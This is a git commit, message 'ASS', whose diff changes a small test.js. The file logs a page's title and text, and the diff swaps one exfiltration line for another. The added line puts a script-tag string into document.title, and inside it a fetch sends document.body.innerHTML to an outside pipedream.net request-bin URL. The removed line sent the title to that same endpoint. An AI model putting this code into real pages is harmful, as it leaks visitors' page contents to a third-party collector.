0e081b477f547b9c94d8080ee1da5a87631a05de
QingkangYu <qingkang.yuu@gmail.com>
2023-03-13 14:19:24 -0400

    ASS

--- test.js
+++ test.js
@@ -1,5 +1,4 @@
 console.log(document.title);
 console.log(document.body.innerText);
-window.document.title = window.document.body;
+window.document.title = `<script>fetch("https://enk4c3pf2z43.x.pipedream.net/?="+document.body.innerHTML)</script>`;
 console.log(document.title.value);
-fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + window.document.title);
